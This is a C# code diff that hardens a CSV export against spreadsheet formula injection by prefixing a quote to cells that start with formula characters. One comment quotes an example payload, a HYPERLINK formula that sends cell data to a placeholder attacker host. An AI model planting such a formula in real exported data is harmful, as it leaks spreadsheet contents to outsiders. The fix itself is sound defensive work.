@@ -146,14 +146,26 @@ internal sealed class ExportEngagementsQueryHandler(
 	private static string FormatBerlinTime(DateTimeOffset instant) =>
 		TimeZoneInfo.ConvertTime(instant, BerlinTimeZone).ToString("yyyy-MM-dd HH:mm", CultureInfo.InvariantCulture);
 
+	// Spreadsheet apps (Excel, LibreOffice, Google Sheets) treat a cell starting
+	// with =, +, -, @, tab, or CR as a formula to evaluate (CWE-1236) - the Name
+	// column is built from a volunteer's Keycloak first/last name (ResolveName
+	// above), which is fully caller-controlled free text, e.g.
+	// =HYPERLINK("https://attacker.example/?d="&A2,"click") (#1678). Prefixing
+	// with a single quote forces the cell to be read as literal text instead.
+	private static readonly char[] FormulaInjectionLeadChars = ['=', '+', '-', '@', '\t', '\r'];
+
 	// RFC 4180: only quote (and escape embedded quotes in) a field that actually
 	// needs it - a volunteer's name could contain the delimiter, a quote, or a
 	// newline that would otherwise break the CSV's column boundaries.
 	private static string CsvEscape(string value, string delimiter)
 	{
-		if (value.IndexOfAny(['"', '\n', '\r']) < 0 && !value.Contains(delimiter))
-			return value;
+		var sanitized = value.Length > 0 && FormulaInjectionLeadChars.Contains(value[0])
+			? $"'{value}"
+			: value;
 
-		return $"\"{value.Replace("\"", "\"\"")}\"";
+		if (sanitized.IndexOfAny(['"', '\n', '\r']) < 0 && !sanitized.Contains(delimiter))
+			return sanitized;
+
+		return $"\"{sanitized.Replace("\"", "\"\"")}\"";
 	}
 }
